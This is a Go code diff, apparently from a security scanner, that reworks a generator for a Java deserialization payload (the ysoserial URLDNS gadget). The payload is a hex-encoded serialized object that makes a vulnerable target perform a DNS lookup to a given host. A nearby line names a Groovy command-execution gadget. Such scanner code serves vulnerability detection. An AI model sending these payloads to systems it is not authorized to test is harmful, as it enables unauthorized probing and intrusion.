@@ -5,6 +5,7 @@ import (
 	"compress/gzip"
 	"encoding/base64"
 	"encoding/hex"
+	"net/url"
 	"strings"
 )
 
@@ -119,17 +120,32 @@ func generateGroovy1Payload(cmd string) []byte {
 }
 
 // generateDNSPayload generates DNS interaction deserialization paylaod for a DNS Name.
-// Based on Gabriel Lawrence gadget
-func generateDNSPayload(url string) []byte {
+// Taken from ysoserial DNS gadget.
+func generateDNSPayload(URL string) []byte {
+	parsed, err := url.Parse(URL)
+	if err != nil {
+		return nil
+	}
 	buffer := &bytes.Buffer{}
+	hostname := parsed.Hostname()
 
 	prefix, _ := hex.DecodeString("ACED0005737200116A6176612E7574696C2E486173684D61700507DAC1C31660D103000246000A6C6F6164466163746F724900097468726573686F6C6478703F4000000000000C770800000010000000017372000C6A6176612E6E65742E55524C962537361AFCE47203000749000868617368436F6465490004706F72744C0009617574686F726974797400124C6A6176612F6C616E672F537472696E673B4C000466696C6571007E00034C0004686F737471007E00034C000870726F746F636F6C71007E00034C000372656671007E00037870FFFFFFFFFFFFFFFF7400")
 	buffer.Write(prefix)
-	buffer.WriteString(string(rune(len(url))))
-	buffer.WriteString(url)
-	suffix, _ := hex.DecodeString("74000071007E00057400056874747073707874001968747470733A2F2F746573742E6A6578626F73732E696E666F78")
-	buffer.Write(suffix)
 
+	buffer.WriteString(string(rune(len(hostname))))
+	buffer.WriteString(hostname)
+
+	middle, _ := hex.DecodeString("74000071007E0005740005")
+	buffer.Write(middle)
+	buffer.WriteString(parsed.Scheme)
+
+	middle, _ = hex.DecodeString("70787400")
+	buffer.Write(middle)
+	buffer.WriteString(string(rune(len(URL))))
+	buffer.WriteString(URL)
+
+	suffix, _ := hex.DecodeString("78")
+	buffer.Write(suffix)
 	return buffer.Bytes()
 }
 
